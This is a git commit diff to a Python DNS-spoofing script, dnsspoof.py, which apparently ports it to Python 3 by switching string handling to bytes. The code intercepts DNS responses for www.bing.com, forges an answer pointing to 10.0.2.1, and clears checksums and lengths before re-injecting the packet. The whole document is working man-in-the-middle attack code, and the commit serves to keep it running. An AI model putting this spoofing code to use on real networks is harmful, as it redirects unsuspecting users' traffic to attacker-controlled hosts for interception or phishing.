94a3104055cd64b05d4da5b8087f14388c2f0b60
0d1nss0n <115773776+0d1nss0n@users.noreply.github.com>
2022-10-23 18:07:14 -0700

    Update dnsspoof.py

--- dnsspoof.py
+++ dnsspoof.py
@@ -8,7 +8,7 @@ def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.DNSRR):
         qname = scapy_packet[scapy.DNSQR].qname
-        if "www.bing.com" in qname:
+        if b"www.bing.com" in qname:
             print("[+] Spoofing Target")
             answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.1")
             scapy_packet[scapy.DNS].an = answer
@@ -19,7 +19,7 @@ def process_packet(packet):
             del scapy_packet[scapy.UDP].chksum
             del scapy_packet[scapy.UDP].len
 
-            packet.set_payload(str(scapy_packet))
+            packet.set_payload(bytes(scapy_packet))
 
     packet.accept()
 
